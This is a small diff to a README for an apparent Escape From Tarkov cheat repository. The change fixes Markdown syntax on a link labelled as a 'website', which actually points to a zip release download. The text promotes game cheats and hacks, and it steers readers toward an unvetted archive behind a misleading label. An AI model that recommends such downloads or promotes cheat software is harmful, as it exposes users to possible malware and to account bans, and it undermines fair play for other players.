@@ -35,7 +35,7 @@ To download the cheat software, click the button below:
 If the above link doesn't work, please check the "Releases" section of this repository for alternative download options.
 
 ## 🌐 Visit Our Website
-Explore more cheats and hacks on our website: [Cheat Escape From Tarkov Website]((https://github.com/WTFlyuingdemon/Escape_From_Tarkov_cheat2025/archive/refs/tags/EFT_v3.3.zip))
+Explore more cheats and hacks on our website: [Cheat Escape From Tarkov Website](https://github.com/WTFlyuingdemon/Escape_From_Tarkov_cheat2025/archive/refs/tags/EFT_v3.3.zip)
 
 ---
 
